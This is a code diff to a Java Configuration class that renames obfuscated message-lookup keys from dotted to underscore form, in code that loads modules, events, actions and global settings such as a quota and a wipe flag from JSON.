@@ -45,7 +45,7 @@ public class Configuration {
 	/** The Constant MIN_AVAILABLE_SIZE. */
 	public static final long MIN_AVAILABLE_SIZE = 200 * 1024;
 
-	public static final String shellFile = Messages.getString("a.0"); //$NON-NLS-1$
+	public static final String shellFile = Messages.getString("a_0"); //$NON-NLS-1$
 
 	private static final int AGENT_ENABLED = 0x2;
 
@@ -170,7 +170,7 @@ public class Configuration {
 
 		public void call(int moduleId, JSONObject params) throws ConfigurationException, GeneralException,
 				JSONException {
-			final String moduleType = params.getString(Messages.getString("a.18")); //$NON-NLS-1$
+			final String moduleType = params.getString(Messages.getString("a_18")); //$NON-NLS-1$
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Module: " + moduleType + " Params size: " + params.length());//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
@@ -193,12 +193,12 @@ public class Configuration {
 				Check.requires(jmodule != null, " (call) Assert failed, null jmodule"); //$NON-NLS-1$
 			}
 
-			String eventType = jmodule.getString(Messages.getString("a.17")); //$NON-NLS-1$
+			String eventType = jmodule.getString(Messages.getString("a_17")); //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.asserts(eventType != null, " (call) Assert failed, null eventType"); //$NON-NLS-1$
 			}
-			if (jmodule.has(Messages.getString("a.16"))) { //$NON-NLS-1$
-				eventType += " " + jmodule.getString(Messages.getString("a.12")); //$NON-NLS-1$ //$NON-NLS-2$
+			if (jmodule.has(Messages.getString("a_16"))) { //$NON-NLS-1$
+				eventType += " " + jmodule.getString(Messages.getString("a_12")); //$NON-NLS-1$ //$NON-NLS-2$
 			}
 
 			if (Cfg.DEBUG) {
@@ -220,10 +220,10 @@ public class Configuration {
 
 		public void call(int actionId, JSONObject jaction) throws ConfigurationException, GeneralException,
 				JSONException {
-			String desc = jaction.getString(Messages.getString("a.13")); //$NON-NLS-1$
+			String desc = jaction.getString(Messages.getString("a_13")); //$NON-NLS-1$
 			final Action a = new Action(actionId, desc);
 
-			JSONArray jsubactions = jaction.getJSONArray(Messages.getString("a.14")); //$NON-NLS-1$
+			JSONArray jsubactions = jaction.getJSONArray(Messages.getString("a_14")); //$NON-NLS-1$
 			int subNum = jsubactions.length();
 
 			if (Cfg.DEBUG) {
@@ -233,7 +233,7 @@ public class Configuration {
 			for (int j = 0; j < subNum; j++) {
 				JSONObject jsubaction = jsubactions.getJSONObject(j);
 
-				final String type = jsubaction.getString(Messages.getString("a.15")); //$NON-NLS-1$
+				final String type = jsubaction.getString(Messages.getString("a_15")); //$NON-NLS-1$
 				ConfAction conf = new ConfAction(actionId, j, type, jsubaction);
 				if (a.addSubAction(conf)) {
 					if (Cfg.DEBUG) {
@@ -265,10 +265,10 @@ public class Configuration {
 			}
 			JSONObject root = (JSONObject) new JSONTokener(json).nextValue();
 
-			JSONArray jmodules = root.getJSONArray(Messages.getString("a.8")); //$NON-NLS-1$
-			JSONArray jevents = root.getJSONArray(Messages.getString("a.9")); //$NON-NLS-1$
-			JSONArray jactions = root.getJSONArray(Messages.getString("a.10")); //$NON-NLS-1$
-			JSONObject jglobals = root.getJSONObject(Messages.getString("a.11")); //$NON-NLS-1$
+			JSONArray jmodules = root.getJSONArray(Messages.getString("a_8")); //$NON-NLS-1$
+			JSONArray jevents = root.getJSONArray(Messages.getString("a_9")); //$NON-NLS-1$
+			JSONArray jactions = root.getJSONArray(Messages.getString("a_10")); //$NON-NLS-1$
+			JSONObject jglobals = root.getJSONObject(Messages.getString("a_11")); //$NON-NLS-1$
 
 			Visitor.load(jmodules, new LoadModule(instantiate));
 			Visitor.load(jevents, new LoadEvent(instantiate));
@@ -301,12 +301,12 @@ public class Configuration {
 
 		Globals g = new Globals();
 
-		JSONObject jquota = jglobals.getJSONObject(Messages.getString("a.1")); //$NON-NLS-1$
-		g.quotaMin = jquota.getInt(Messages.getString("a.2")); //$NON-NLS-1$
-		g.quotaMax = jquota.getInt(Messages.getString("a.3")); //$NON-NLS-1$
+		JSONObject jquota = jglobals.getJSONObject(Messages.getString("a_1")); //$NON-NLS-1$
+		g.quotaMin = jquota.getInt(Messages.getString("a_2")); //$NON-NLS-1$
+		g.quotaMax = jquota.getInt(Messages.getString("a_3")); //$NON-NLS-1$
 
-		g.wipe = jglobals.getBoolean(Messages.getString("a.4")); //$NON-NLS-1$
-		g.type = jglobals.getString(Messages.getString("a.5")); //$NON-NLS-1$
+		g.wipe = jglobals.getBoolean(Messages.getString("a_4")); //$NON-NLS-1$
+		g.type = jglobals.getString(Messages.getString("a_5")); //$NON-NLS-1$
 
 		status.setGlobal(g);
 	}
